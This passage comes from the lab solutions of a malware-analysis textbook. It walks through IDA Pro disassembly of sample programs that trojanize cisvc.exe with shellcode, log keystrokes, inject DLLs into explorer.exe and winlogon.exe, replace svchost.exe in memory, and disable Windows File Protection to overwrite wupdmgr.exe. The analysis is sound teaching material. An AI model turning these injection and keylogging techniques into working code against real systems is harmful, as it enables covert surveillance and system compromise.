shellcode, which loads the DLL.
[Word Count: 26]

4.
The malware infects cisvc.exe to load inet_epar32.dll and call its export 
zzz69806582.
[Word Count: 13]

5.
Lab11-03.dll is a polling keylogger implemented in its export zzz69806582.
[Word Count: 11]

6.
The malware stores keystrokes and the window into which keystrokes 
were entered to C:\Windows\System32\kernel64x.dll.
[Word Count: 15]

Finally, the malware starts the indexing service by issuing the command 
net start cisvc. Using Process Explorer, we see that cisvc.exe is now running 
on the system. Since we suspect that the malware might be logging keystrokes, 
we open notepad.exe and enter a bunch of a characters. We see that kernel64x.dll 
is created. Suspecting that keystrokes are logged, we open kernel64x.dll in a hex 
editor and see the following output:
[Word Count: 70]

Untitled - Notepad: 0x41 
Untitled - Notepad: 0x41 
Untitled - Notepad: 0x41 
Untitled - Notepad: 0x41
[Word Count: 16]

Our keystrokes have been logged to kernel64x.dll. We also see that the 
program in which we typed our keystrokes (Notepad) has been logged along 
with the keystroke data in hexadecimal. (The malware doesn’t turn the hexa-
decimal values into readable strings, so the malware author probably has a 
postprocessing script to more easily read what is entered.)
Next, we use in-depth techniques to determine why the malware is start-
ing a service and how the keylogger is gaining execution. We begin by load-
ing Lab11-03.exe into IDA Pro and examining the main function, as shown in 
Listing 11-17L.
[Word Count: 98]

004012DB         push    offset NewFileName      ; "C:\\WINDOWS\\System32\\
inet_epar32.dll"
004012E0         push    offset ExistingFileName ; "Lab11-03.dll"
004012E5         call    ds:CopyFileA 
004012EB         push    offset aCisvc_exe       ; "cisvc.exe"
004012F0         push    offset Format           ; "C:\\WINDOWS\\System32\\%s"
004012F5         lea     eax, [ebp+FileName]
004012FB         push    eax                     ; Dest
004012FC         call    _sprintf
00401301         add     esp, 0Ch
00401304         lea     ecx, [ebp+FileName]
0040130A         push    ecx                     ; lpFileName
0040130B         call    sub_401070 
00401310         add     esp, 4
00401313         push    offset aNetStartCisvc   ; "net start cisvc" 
00401318         call    system
[Word Count: 74]

Listing 11-17L: Reviewing the main method of Lab11-03.exe
[Word Count: 8]

At , we see that the main method begins by copying Lab11-03.dll to 
inet_epar32.dll in C:\Windows\System32. Next, it builds the string C:\WINDOWS\
System32\cisvc.exe and passes it to sub_401070 at . Finally, the malware starts 
the indexing service by using system to run the command net start cisvc at .
We focus on sub_401070 to see what it might be doing with cisvc.exe. There 
is a lot of confusing code in sub_401070, so take a high-level look at this func-
tion using the cross-reference diagram shown in Figure 11-6L.
[Word Count: 88]

Figure 11-6L: Cross-reference graph for sub_401070
[Word Count: 6]

0040127C         mov     edi, [ebp+lpBaseAddress] 
0040127F         add     edi, [ebp+var_28]
00401282         mov     ecx, 4Eh
00401287         mov     esi, offset byte_409030 
0040128C         rep movsd
[Word Count: 22]

Listing 11-18L: Writing 312 bytes of shellcode into cisvc.exe
[Word Count: 9]

At , the mapped location of the file is moved into EDI and adjusted 
by some offset using var_28. Next, ECX is loaded with 0x4E, the number of 
DWORDs to write (movsd). Therefore, the total number of bytes is 0x4E * 4 = 312 
bytes in decimal. Finally, byte_409030 is moved into ESI at , and rep movsd 
copies the data at byte_409030 into the mapped file. We examine the data at 
0x409030 and see the bytes in the left side of Table 11-1L.
[Word Count: 84]

The left side of the table contains raw bytes, but if we put the cursor at 
0x409030 and press C in IDA Pro, we get the disassembly shown in the right 
side of the table. This is shellcode—handcrafted assembly that, in this case, is
[Word Count: 44]

Table 11-1L: The Shellcode Written to cisvc.exe
[Word Count: 7]

00409030 unk_409030 db  55h
00409031            db  89h
00409032            db 0E5h
00409033            db  81h
00409034            db 0ECh
00409035            db  40h
[Word Count: 19]

00409030         push    ebp
00409031         mov     ebp, esp
00409033         sub     esp, 40h
00409039         jmp     loc_409134
[Word Count: 14]

used for process injection. Rather than analyze the shellcode (doing so can 
be a bit complicated and messy), we’ll guess at what it does based on the 
strings it contains. 
Toward the end of the 312 bytes of shellcode, we see two strings:
[Word Count: 43]

00409139 aCWindowsSystem   db 'C:\WINDOWS\System32\inet_epar32.dll',0
0040915D aZzz69806582      db 'zzz69806582',0
[Word Count: 8]

Figure 11-7L: PEview of original and trojanized versions of cisvc.exe
[Word Count: 10]

The top part of Figure 11-7L shows the original cisvc.exe (named 
cisvc_original.exe) loaded into PEview, and the bottom part shows the tro-
janized cisvc.exe. At  and , we see that the entry point differs in the two 
binaries. If we load both binaries into IDA Pro, we see that the malware has 
performed entry-point redirection so that the shellcode runs before the 
original entry point any time that cisvc.exe is launched. Listing 11-19L shows 
a snippet of the shellcode in the trojanized version of cisvc.exe.
[Word Count: 86]

01001B0A         call    dword ptr [ebp-4] 
01001B0D         mov     [ebp-10h], eax
01001B10         lea     eax, [ebx+24h]
01001B16         push    eax
01001B17         mov     eax, [ebp-10h] 
01001B1A         push    eax
[Word Count: 24]

01001B1B         call    dword ptr [ebp-0Ch] 
01001B1E         mov     [ebp-8], eax
01001B21         call    dword ptr [ebp-8] 
01001B24         mov     esp, ebp
01001B26         pop     ebp
01001B27         jmp     _wmainCRTStartup 
[Word Count: 27]

Listing 11-19L: Important calls within the shellcode inside the trojanized cisvc.exe
[Word Count: 11]

Now we load the trojanized version of cisvc.exe into a debugger and set 
a breakpoint at 0x1001B0A. We find that at , the malware calls LoadLibrary 
to load inet_epar32.dll into memory. At , the malware calls GetProcAddress 
with the argument zzz69806582 to get the address of the exported function. 
At , the malware calls zzz69806582. Finally, the malware jumps to the origi-
nal entry point at , so that the service can run as it would normally. The 
shellcode’s function matches our earlier suspicion that it loads inet_epar32.dll 
and calls its export.
[Word Count: 92]

Next, we analyze inet_epar32.dll, which is the same as Lab11-03.dll. We load 
Lab11-03.dll into IDA Pro and begin to analyze the file. The majority of the 
code stems from the zzz69806582 export. This export starts a thread and 
returns, so we will focus on analyzing the thread, as shown in Listing 11-20L.
[Word Count: 52]

1000149D         push    offset Name             ; "MZ"
100014A2         push    1                       ; bInitialOwner
100014A4         push    0                       ; lpMutexAttributes
100014A6         call    ds:CreateMutexA 
...
100014BD         push    0                       ; hTemplateFile
100014BF         push    80h                     ; dwFlagsAndAttributes
100014C4         push    4                       ; dwCreationDisposition
100014C6         push    0                       ; lpSecurityAttributes
100014C8         push    1                       ; dwShareMode
100014CA         push    0C0000000h              ; dwDesiredAccess
100014CF         push    offset FileName         ; "C:\\WINDOWS\\System32\\
kernel64x.dll"
100014D4         call    ds:CreateFileA 
[Word Count: 62]

Listing 11-20L: Mutex and file creation performed by the thread created by zzz69806582
[Word Count: 13]

Lab11-03.exe trojanizes and then starts the Windows indexing service (cisvc.exe). 
The trojan shellcode loads a DLL and calls an exported function that 
launches a keylogger. The export creates the mutex MZ and logs all key-
strokes to kernel64x.dll in the Windows system directory.
[Word Count: 43]

1.
After you run the malware, pop-up messages are displayed on the screen 
every minute.
[Word Count: 15]

2.
The process being injected is explorer.exe.
[Word Count: 7]

3.
You can restart the explorer.exe process.
[Word Count: 7]

4.
The malware performs DLL injection to launch Lab12-01.dll within 
explorer.exe. Once Lab12-01.dll is injected, it displays a message box on 
the screen every minute with a counter that shows how many minutes 
have elapsed.
[Word Count: 35]

0040111F         push    offset ProcName         ; "EnumProcessModules"
00401124         push    offset LibFileName      ; "psapi.dll"
00401129         call    ds:LoadLibraryA
0040112F         push    eax                     ; hModule
00401130         call    ds:GetProcAddress
00401136         mov 
dword_408714, eax
[Word Count: 27]

Listing 12-1L: Dynamically resolving process enumeration imports
[Word Count: 7]

00401078         push    104h
0040107D         lea     ecx, [ebp+Str1]
00401083         push    ecx
00401084         mov     edx, [ebp+var_10C]
0040108A         push    edx
0040108B         mov     eax, [ebp+hObject]
0040108E         push    eax
0040108F         call    dword_40870C          ; GetModuleBaseNameA
00401095         push    0Ch                     ; MaxCount
00401097         push    offset Str2             ; "explorer.exe"
0040109C         lea     ecx, [ebp+Str1]
004010A2         push    ecx                     ; Str1
004010A3         call    _strnicmp 
[Word Count: 54]

Listing 12-2L: Strings compared against explorer.exe
[Word Count: 6]

The dynamically resolved function GetModuleBaseNameA is used to translate 
from the PID to the process name. After this call, we see a comparison at  
between the strings obtained with GetModuleBaseNameA (Str1) and explorer.exe 
(Str2). The malware is looking for the explorer.exe process in memory. 
Once explorer.exe is found, the function at sub_401000 will return 1, and 
the main function will call OpenProcess to open a handle to it. If the malware 
obtains a handle to the process successfully, the code in Listing 12-3L will 
execute, and the handle hProcess will be used to manipulate the process.
[Word Count: 97]

0040128C         push    4                       ; flProtect
0040128E         push    3000h                   ; flAllocationType
00401293         push    104h  
; dwSize
00401298         push    0                       ; lpAddress
0040129A         mov     edx, [ebp+hProcess]
004012A0         push    edx                     ; hProcess
004012A1         call    ds:VirtualAllocEx 
004012A7         mov     [ebp+lpParameter], eax 
004012AD         cmp     [ebp+lpParameter], 0
004012B4         jnz     short loc_4012BE
...
[Word Count: 48]

004012BE         push    0                       ; lpNumberOfBytesWritten
004012C0         push    104h                    ; nSize
004012C5         lea     eax, [ebp+Buffer]
004012CB         push    eax                     ; lpBuffer
004012CC         mov     ecx, [ebp+lpParameter]
004012D2         push    ecx                     ; lpBaseAddress
004012D3         mov     edx, [ebp+hProcess]
004012D9         push    edx                     ; hProcess
004012DA         call    ds:WriteProcessMemory 
[Word Count: 41]

Listing 12-3L: Writing a string to a remote process
[Word Count: 9]

004012E0         push    offset ModuleName       ; "kernel32.dll"
004012E5         call    ds:GetModuleHandleA
004012EB         mov     [ebp+hModule], eax
004012F1         push    offset aLoadlibrarya    ; "LoadLibraryA"
004012F6         mov     eax, [ebp+hModule]
004012FC         push    eax                     ; hModule
004012FD         call    ds:GetProcAddress
00401303         mov     [ebp+lpStartAddress], eax 
00401309         push    0                       ; lpThreadId
0040130B         push    0                       ; dwCreationFlags
0040130D         mov     ecx, [ebp+lpParameter]
00401313         push    ecx                     ; lpParameter
00401314         mov     edx, [ebp+lpStartAddress]
0040131A         push    edx  
; lpStartAddress
0040131B         push    0                       ; dwStackSize
0040131D         push    0                       ; lpThreadAttributes
0040131F         mov     eax, [ebp+hProcess]
00401325         push    eax                     ; hProcess
00401326         call    ds:CreateRemoteThread
[Word Count: 87]

Listing 12-4L: Creating the remote thread
[Word Count: 6]

In Listing 12-4L, the calls to GetModuleHandleA and GetProcAddress (in bold) will 
be used to get the address to LoadLibraryA. The address of LoadLibraryA will be 
the same in explorer.exe as it is in the malware (Lab12-01.exe) with the address of 
LoadLibraryA inserted into lpStartAddress shown at . lpStartAddress is provided 
to CreateRemoteThread at  in order to force explorer.exe to call LoadLibraryA.
[Word Count: 63]

Figure 12-1L: Process Explorer view showing injected DLL
[Word Count: 8]

Having analyzed Lab12-01.exe, we move on to Lab12-01.dll to see if it does 
something in addition to creating message boxes. When we analyze Lab12-
01.dll with IDA Pro, we see that it does little more than create a thread that 
then creates another thread. The code in Listing 12-5L is from the first 
thread, a loop that creates a thread every minute (0xEA60 milliseconds).
[Word Count: 64]

10001046         mov     ecx, [ebp+var_18]
10001049         push    ecx
1000104A         push    offset Format    ; "Practical Malware Analysis %d"
1000104F         lea     edx, [ebp+Parameter]
10001052         push    edx                     ; Dest
10001053         call    _sprintf 
10001058         add     esp, 0Ch
1000105B         push    0                       ; lpThreadId
1000105D         push    0                       ; dwCreationFlags
1000105F         lea     eax, [ebp+Parameter]
10001062         push    eax                     ; lpParameter
10001063         push    offset StartAddress  ; lpStartAddress
10001068         push    0                       ; dwStackSize
1000106A         push    0                       ; lpThreadAttributes
1000106C         call    ds:CreateThread
[Word Count: 72]

10001072         push    0EA60h                  ; dwMilliseconds
10001077         call    ds:Sleep
1000107D         mov     ecx, [ebp+var_18]
10001080         add     ecx, 1 
10001083         mov     [ebp+var_18], ecx
[Word Count: 21]

Listing 12-5L: Analyzing the thread created by Lab12-01.dll
[Word Count: 8]

The new thread at , labeled StartAddress by IDA Pro, creates the mes-
sage box that says “Press OK to reboot,” and takes a parameter for the title of 
the box that is set by the sprintf at . This parameter is the format string 
"Practical Malware Analysis %d", where %d is replaced with a counter stored in 
var_18 that increments at . We conclude that this DLL does nothing other 
than produce annoying message boxes that increment by one every minute.
[Word Count: 82]

1.
The purpose of this program is to covertly launch another program.
[Word Count: 12]

2.
The program uses process replacement to hide execution.
[Word Count: 9]

3.
The malicious payload is stored in the program’s resource section. The 
resource has type UNICODE and the name LOCALIZATION.
[Word Count: 20]

4.
The malicious payload stored in the program’s resource section is XOR-
encoded. This decode routine can be found at sub_40132C. The XOR byte 
is found at 0x0040141B.
[Word Count: 28]

5.
The strings are XOR-encoded using the function at sub_401000.
[Word Count: 10]

00401145         lea     edx, [ebp+ProcessInformation]
00401148         push    edx                   ; lpProcessInformation
00401149         lea     eax, [ebp+StartupInfo]
0040114C         push    eax                     ; lpStartupInfo
0040114D         push    0                       ; lpCurrentDirectory
0040114F         push    0                       ; lpEnvironment
00401151         push    4  
; dwCreationFlags
[Word Count: 35]

00401153         push    0                       ; bInheritHandles
00401155         push    0                       ; lpThreadAttributes
00401157         push    0                       ; lpProcessAttributes
00401159         push    0                       ; lpCommandLine
0040115B         mov     ecx, [ebp+lpApplicationName]
0040115E         push    ecx                     ; lpApplicationName
0040115F         call    ds:CreateProcessA
...
00401191         mov     ecx, [ebp+ProcessInformation.hThread]
00401194         push    ecx                     ; hThread
00401195         call    ds:GetThreadContext 
[Word Count: 46]

Listing 12-6L: Creating a suspended process and accessing the main thread’s context
[Word Count: 12]

Figure 12-2L: IDA Pro structure offset resolution
[Word Count: 7]

The EBX register of a suspended newly created process always contains a 
pointer to the Process Environment Block (PEB) data structure. As shown in 
Listing 12-7L, at , the program increments the PEB data structure by 8 bytes 
and pushes the value onto the stack as the start address for the memory read.
[Word Count: 53]

004011B8         push    0                       ; lpNumberOfBytesRead
004011BA         push    4  
; nSize
004011BC         lea     edx, [ebp+Buffer]
004011BF         push    edx                     ; lpBuffer
004011C0         mov     eax, [ebp+lpContext]
004011C3         mov     ecx, [eax+CONTEXT._Ebx]
004011C9         add     ecx, 8 
004011CC         push    ecx                     ; lpBaseAddress
004011CD         mov     edx, [ebp+ProcessInformation.hProcess]
004011D0         push    edx                     ; hProcess
004011D1         call    ds:ReadProcessMemory
[Word Count: 50]

Listing 12-7L: Reading a PEB data structure
[Word Count: 7]

00401209         push    40h                   ; flProtect
0040120B         push    3000h                   ; flAllocationType
00401210         mov     edx, [ebp+var_8]
00401213         mov     eax, [edx+50h]
00401216         push    eax                     ; dwSize
00401217         mov     ecx, [ebp+var_8]
0040121A         mov     edx, [ecx+34h]
0040121D         push    edx                     ; lpAddress
0040121E         mov     eax, [ebp+ProcessInformation.hProcess]
00401221         push    eax                     ; hProcess
00401222         call    ds:VirtualAllocEx
[Word Count: 48]

Listing 12-8L: Allocating memory for an executable within a suspended process
[Word Count: 11]

Notice that this listing shows the program allocating memory within the 
suspended processes address space, at . This is behavior that requires fur-
ther investigation. 
At the beginning of the function, the program checks for the MZ magic 
value at 0x004010FE and a PE magic value at 0x00401119. If the checks are 
valid, we know that var_8 contains a pointer to the PE header loaded in 
memory. 
At , the program requests that the memory be allocated at the address 
of the ImageBase of the buffer-based PE file, which tells the Windows loader
[Word Count: 93]

Listing 12-9L: Copying PE sections into memory
[Word Count: 7]

004012AC        push    eax                     ; lpBaseAddress
004012AD        mov     ecx, [ebp+ProcessInformation.hProcess]
004012B0        push    ecx                     ; hProcess
004012B1        call    ds:WriteProcessMemory
004012B7        jmp     short loc_401260
[Word Count: 21]

Listing 12-10L: Copying PE sections into memory using IDA Pro structures
[Word Count: 11]

004012DB
mov
eax, [ebp+var_8]
004012DE
mov
ecx, [ebp+lpBaseAddress]
004012E1
add
ecx, [eax+IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
004012E4
mov
edx, [ebp+lpContext]
004012E7
mov
[edx+CONTEXT._Eax], ecx 
004012ED
mov
eax, [ebp+lpContext]
004012F0
push
eax                     ; lpContext
004012F1
mov
ecx, [ebp+ProcessInformation.hThread]
004012F4
push
ecx                     ; hThread
004012F5
call
ds:SetThreadContext
004012FB
mov
edx, [ebp+ProcessInformation.hThread]
004012FE
push
edx                     ; hThread
004012FF
call
ds:ResumeThread 
[Word Count: 55]

Listing 12-11L: Resuming a suspended process
[Word Count: 6]

00401508         push    400h                    ; uSize
0040150D         lea     eax, [ebp+Dst] 
00401513         push    eax                     ; Str
00401514         push    offset aSvchost_exe  ; "\\svchost.exe"
00401519         call    sub_40149D
[Word Count: 25]

Listing 12-12L: Building the path string
[Word Count: 6]

00401521         mov     ecx, [ebp+hModule]
00401527         push    ecx                     ; hModule
00401528         call    sub_40132C 
0040152D         add     esp, 4
00401530         mov     [ebp+lpBuffer], eax 
[Word Count: 22]

Listing 12-13L: Loading the executable that replaces svchost.exe
[Word Count: 8]

Figure 12-3L: Resource Hacker showing an encoded binary in the resource section
[Word Count: 12]

NOTE
WinHex is a hex editor available at http://www.x-ways.net/winhex/ and the free 
trial version is useful for malware analysis. We use it here for illustrative purposes, but 
most hex editors can perform a single-byte XOR operation.
[Word Count: 36]

We can conclude that this malware decodes a binary from its resource 
section and performs process replacement on svchost.exe with the decoded 
binary.
[Word Count: 23]

2.
The program uses hook injection to steal keystrokes.
[Word Count: 9]

3.
The program creates the file practicalmalwareanalysis.log to store the 
keystrokes.
[Word Count: 11]

00401053         push    eax                     ; hmod
00401054         push    offset fn             ; lpfn 
00401059         push    0Dh                     ; idHook
[Word Count: 17]

0040105B         call    ds:SetWindowsHookExA 
00401061         mov     [ebp+hhk], eax
[Word Count: 8]

Listing 12-14L: SetWindowsHookEx called from main
[Word Count: 6]

0040108F         cmp     [ebp+wParam], WM_SYSKEYDOWN 
00401096         jz      short loc_4010A1
00401098         cmp     [ebp+wParam], WM_KEYDOWN 
0040109F         jnz     short loc_4010AF
004010A1
004010A1 loc_4010A1:                             ; CODE XREF: fn+10j
004010A1         mov     eax, [ebp+lParam]
004010A4         mov     ecx, [eax+KBDLLHOOKSTRUCT.vkCode] 
004010A6         push    ecx                     ; Buffer
004010A7         call    sub_4010C7
[Word Count: 42]

004010E6         push    offset FileName     ; "practicalmalwareanalysis.log"
004010EB         call    ds:CreateFileA
...
[Word Count: 10]

0040110F         push    400h                    ; nMaxCount
00401114         push    offset String           ; lpString
00401119         call    ds:GetForegroundWindow
0040111F         push    eax                     ; hWnd
00401120         call    ds:GetWindowTextA
00401126         push    offset String           ; Str2
0040112B         push    offset Dest             ; Str1
00401130         call    _strcmp
[Word Count: 37]

Listing 12-16L: Opening the log file and getting the window title
[Word Count: 11]

Once the program writes the window title to the log file, it enters a large 
jump table, as shown in Listing 12-17L at . Recognizing that var_C contains 
the virtual key code that was passed into the function, we see the virtual key 
code used as an index to a lookup table at . The value received from the 
lookup table is used as an index into the jump table off_401441 at .
[Word Count: 73]

0040120B         sub     eax, 8 
...
0040121B         mov     edx, [ebp+var_C]
0040121E         xor     ecx, ecx
00401220         mov     cl, ds:byte_40148D[edx]
00401226         jmp     ds:off_401441[ecx*4]    ; switch jump
[Word Count: 25]

Listing 12-17L: Virtual key code jump table
[Word Count: 7]

We follow the lookup process by choosing a value like VK_SHIFT (0x10). 
At , 8 is subtracted from the value, leaving us with 0x8 (0x10 – 0x8). 
Looking at offset 0x8 into byte_40148D, as shown in Listing 12-18L, pro-
vides the value 3, which is stored in ECX. ECX is then multiplied by 4 at , 
yielding 0xC, which is used as an offset into off_401441. This returns the loca-
tion loc_401249, where we find the string [SHIFT] written to the log file.
[Word Count: 83]

byte_40148D     db      0,     1,   12h,   12h
                db    12h,     2,   12h,   12h 
                db      3,     4,   12h,   12h
[Word Count: 16]

Listing 12-18L: The offset table for byte_40148D
[Word Count: 7]

We are able to conclude that this malware is a keylogger that logs 
keystrokes to the file practicalmalwareanalysis.log. This keylogger uses 
SetWindowsHookEx to implement its keylogging functionality.
[Word Count: 27]

1.
The malware checks to see if a given PID is winlogon.exe.
[Word Count: 12]

2.
Winlogon.exe is the process injected.
[Word Count: 6]

3.
The DLL sfc_os.dll will be used to disable Windows File Protection.
[Word Count: 12]

4.
The fourth argument passed to CreateRemoteThread is a function pointer to 
an unnamed ordinal 2 (SfcTerminateWatcherThread) of sfc_os.dll.
[Word Count: 19]

5.
The malware drops a binary from its resource section and overwrites the 
old Windows Update binary (wupdmgr.exe) with it. Before overwriting the 
real wupdmgr.exe, the malware copies it to the %TEMP% directory for 
later usage.
[Word Count: 36]

6.
The malware injects a remote thread into winlogon.exe and calls a func-
tion exported by sfc_os.dll, ordinal 2 (SfcTerminateWatcherThread), to disable 
Windows File Protection until the next reboot. The CreateRemoteThread 
call is necessary because this function must be executed inside the 
winlogon.exe process. The malware trojanizes wupdmgr.exe by using that 
executable to update its own malware and call the original Windows 
Update binary, which was saved to the %TEMP% directory.
[Word Count: 71]

GET /updater.exe HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 
2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)
Host: www.practicalmalwareanalysis.com
Connection: Keep-Alive
[Word Count: 33]

Listing 12-19L: HTTP GET request performed after running Lab12-04.exe
[Word Count: 9]

We load the malware into IDA Pro and scroll to the main function at 
address 0x00401350. A few lines from the start of the main function, we see 
the malware resolving functions for Windows process enumeration within 
psapi.dll, as shown in Listing 12-20L.
[Word Count: 43]

004013AA        push    offset ProcName 
; "EnumProcessModules" 
004013AF        push    offset aPsapi_dll ; "psapi.dll"
004013B4        call    ds:LoadLibraryA 
[Word Count: 16]

004013BA        push    eax            
004013BB        call    ds:GetProcAddress 
004013C1        mov     dword_40312C, eax ; Rename to myEnumProcessModules
[Word Count: 15]

Listing 12-20L: Dynamically resolving process enumeration imports
[Word Count: 7]

00401423        lea eax, [ebp+var_1228]
00401429        push eax            ; _DWORD
0040142A        push 1000h          ; _DWORD
0040142F        lea ecx, [ebp+dwProcessId] 
00401435        push ecx            ; _DWORD
00401436        call myEnumProcesses 
0040143C        test eax, eax
0040143E        jnz short loc_401
[Word Count: 36]

The malware then begins to loop through the PIDs, passing each to 
the subroutine at 0x00401000, as shown in Listing 12-22L. We see an index 
into the array referenced by dwProcessId, which is calculated before calling 
sub_401000.
[Word Count: 37]

00401495        mov eax, [ebp+var_1238]
0040149B        mov ecx, [ebp+eax*4+dwProcessId] 
004014A2        push ecx            ; dwProcessId
004014A3        call sub_401000
[Word Count: 16]

We examine the internals of sub_401000 and see two local variables set 
(Str1 and Str2), as shown in Listing 12-23L. The variable Str1 will contain the 
string "<not real>", and Str2 will contain "winlogon.exe".
[Word Count: 34]

0040100A        mov eax, dword ptr aWinlogon_exe ; "winlogon.exe"
0040100F        mov dword ptr [ebp+Str2], eax
...
0040102C        mov ecx, dword ptr aNotReal ; "<not real>"
00401032        mov dword ptr [ebp+Str1], ecx
[Word Count: 30]

Listing 12-23L: Initialization of strings
[Word Count: 5]

Next, the malware passes the loop parameter (dwProcessId) to the 
OpenProcess call in order to obtain a handle to that process, as shown at  
in Listing 12-24L. The handle returned from OpenProcess is stored in EAX 
and passed to the myEnumProcessModules function at , which returns an array 
of handles for each module loaded into a process.
[Word Count: 58]

00401070        push edx            ; dwProcessId
00401071        push 0              ; bInheritHandle
00401073        push 410h           ; dwDesiredAccess
00401078        call ds:OpenProcess 
...
00401087        lea eax, [ebp+var_120]
0040108D        push eax
0040108E        push 4
00401090        lea ecx, [ebp+var_11C]
00401096        push ecx
00401097        mov edx, [ebp+hObject]
0040109A        push edx
0040109B        call myEnumProcessModules
[Word Count: 47]

Listing 12-24L: For each process, enumerate the modules
[Word Count: 8]

As shown in Listing 12-25L, the malware attempts to get the base name 
of the module’s PID by using GetModuleBaseNameA. If it succeeds, Str1 will con-
tain the string of the base name of the module for the PID passed to this sub-
routine; if not, it will keep the initialized value "<not real>".
[Word Count: 54]

004010A5        push 104h
004010AA        lea eax, [ebp+Str1]; will change
004010B0        push eax
004010B1        mov ecx, [ebp+var_11C]
004010B7        push ecx
004010B8        mov edx, [ebp+hObject]
004010BB        push edx
004010BC        call myGetModuleBaseNameA
[Word Count: 29]

Listing 12-25L: Getting the name of each module
[Word Count: 8]

004014A3        call PIDLookup
004014A8        add esp, 4
004014AB        mov [ebp+var_114], eax
004014B1        cmp [ebp+var_114], 0 
004014B8        jz  short loc_4014CF
...
004014E4        mov     ecx, [ebp+var_1234]
004014EA        push    ecx     ; dwProcessId
004014EB        call    sub_401174 
[Word Count: 34]

Listing 12-26L: PID lookup and comparison
[Word Count: 6]

004011A1        push 2              ; lpProcName
004011A3        push offset LibFileName ; "sfc_os.dll"
004011A8        call ds:LoadLibraryA 
004011AE        push eax            ; hModule
004011AF        call ds:GetProcAddress 
004011B5        mov lpStartAddress, eax 
004011BA        mov eax, [ebp+dwProcessId]
004011BD        push eax        ; dwProcessId
004011BE        push 0          ; bInheritHandle
004011C0        push 1F0FFFh    ; dwDesiredAccess
004011C5        call ds:OpenProcess
004011CB        mov [ebp+hProcess], eax 
004011CE        cmp [ebp+hProcess], 0
004011D2        jnz short loc_4011D
[Word Count: 64]

Listing 12-27L: Resolving ordinal 2 of sfc_os.dll and opening a handle to Winlogon
[Word Count: 13]

The code in Listing 12-28L calls CreateRemoteThread. Examining the 
arguments for CreateRemoteThread, we see that the hProcess parameter at  is 
EDX, our winlogon.exe handle. The lpStartAddress passed at  is a pointer to 
the function at sfc_os.dll at ordinal 2 that injects a thread into winlogon.exe. 
(Because sfc_os.dll is already loaded inside winlogon.exe, there is no need to 
load the DLL within the newly created remote thread, so we don’t have a 
call to WriteProcessMemory.) That thread is ordinal 2 of sfc_os.dll.
[Word Count: 83]

004011D8        push 0              ; lpThreadId
004011DA        push 0              ; dwCreationFlags
[Word Count: 10]

004011DC        push 0              ; lpParameter
004011DE        mov ecx, lpStartAddress 
004011E4        push ecx            ; lpStartAddress
004011E5        push 0              ; dwStackSize
004011E7        push 0              ; lpThreadAttributes
004011E9        mov edx, [ebp+hProcess]
004011EC        push edx            ; hProcess 
004011ED        call ds:CreateRemoteThread
[Word Count: 38]

Listing 12-28L: Calling CreateRemoteThread for a remote process
[Word Count: 8]

But what are sfc_os.dll and export ordinal 2? The DLL sfc_os.dll is par-
tially responsible for Windows File Protection, a series of threads running 
within winlogon.exe. Ordinal 2 of sfc_os.dll is an unnamed export known as 
SfcTerminateWatcherThread.
[Word Count: 37]

NOTE
The information about sfc_os.dll and export ordinal 2 given here is undocumented. 
To avoid needing to reverse-engineer the Windows DLL, search the Internet for 
“sfc_os.dll ordinal 2” to see what information you can find.
[Word Count: 35]

00401506        push 10Eh           ; uSize
0040150B        lea edx, [ebp+Buffer]
00401511        push edx            ; lpBuffer
00401512        call ds:GetWindowsDirectoryA 
00401518        push offset aSystem32Wupdmg ; \\system32\\wupdmgr.exe 
0040151D        lea eax, [ebp+Buffer]
00401523        push eax 
00401524        push offset aSS     ; "%s%s"
00401529        push 10Eh           ; Count
0040152E        lea ecx, [ebp+ExistingFileName]
00401534        push ecx            ; Dest
00401535        call ds:_snprintf
[Word Count: 56]

Listing 12-29L: Building a string for the wupdmgr.exe path
[Word Count: 9]

In Listing 12-30L, we see another string being built. A call to GetTempPathA 
at  gives us a pointer to the current user’s temporary directory, usually C:\
Documents and Settings\<username>\Local\Temp. The temporary directory path 
is then passed to another _snprintf call with the parameter \\winup.exe, as 
seen at  and , creating the string "C:\Documents and Settings\username\
Local\Temp\winup.exe", which is stored in NewFileName.
[Word Count: 63]

0040153B        add esp, 14h
0040153E        lea edx, [ebp+var_110]
00401544        push edx            ; lpBuffer
00401545        push 10Eh           ; nBufferLength
0040154A        call ds:GetTempPathA 
00401550        push offset aWinup_exe ; \\winup.exe 
00401555        lea eax, [ebp+var_110]
0040155B        push eax 
0040155C        push offset aSS_0   ; "%s%s"
00401561        push 10Eh           ; Count
00401566        lea ecx, [ebp+NewFileName]
0040156C        push ecx            ; Dest
0040156D        call ds:_snprintf
[Word Count: 60]

Listing 12-30L: Building a string for the winup.exe path
[Word Count: 9]

We can now see why IDA Pro renamed two local variables to NewFileName 
and ExistingFileName. These local variables are used in the MoveFileA call, as 
shown in Listing 12-31L at . The MoveFileA function will move the Windows 
Update binary to the user’s temporary directory.
[Word Count: 45]

00401576        lea edx, [ebp+NewFileName]
0040157C        push edx            ; lpNewFileName
0040157D        lea eax, [ebp+ExistingFileName]
00401583        push eax            ; lpExistingFileName
00401584        call ds:MoveFileA 
[Word Count: 22]

Listing 12-31L: Moving the Windows Update binary to the temporary directory
[Word Count: 11]

In Listing 12-32L, we see the malware calling GetModuleHandleA at , 
which returns a module handle for the current process. We then see a 
series of resources section APIs, specifically, FindResourceA with parameters 
#101 and BIN. As we guessed as a result of our earlier basic analysis, the mal-
ware is extracting its resource section to disk.
[Word Count: 57]

004012A1        call ds:GetModuleHandleA 
004012A7        mov [ebp+hModule], eax
004012AA        push offset Type    ; "BIN"
004012AF        push offset Name    ; "#101"
004012B4        mov eax, [ebp+hModule]
004012B7        push eax            ; hModule
004012B8        call ds:FindResourceA
[Word Count: 32]

Later in this function, following the call to FindResourceA, are calls to 
LoadResource, SizeofResource, CreateFileA, and WriteFile (not shown here). This 
combination of function calls extracts the file from the resource section BIN 
and writes the file to C:\Windows\System32\wupdmgr.exe. The malware is creat-
ing a new Windows Update binary handler. Under normal circumstances, its 
attempt to create a new handler would fail because Windows File Protection
[Word Count: 66]

would detect a change in the file and overwrite the newly created one, but 
because the malware disabled this functionality, it can overwrite normally 
protected Windows binaries. 
The last thing this function does is launch the new wupdmgr.exe using 
WinExec. The function is launched with an uCmdShow parameter of 0, or SW_HIDE, 
as shown at  in Listing 12-33L, in order to hide the program window.
[Word Count: 66]

0040133C        push 0  
; uCmdShow
0040133E        lea edx, [ebp+FileName]
00401344        push edx            ; lpCmdLine
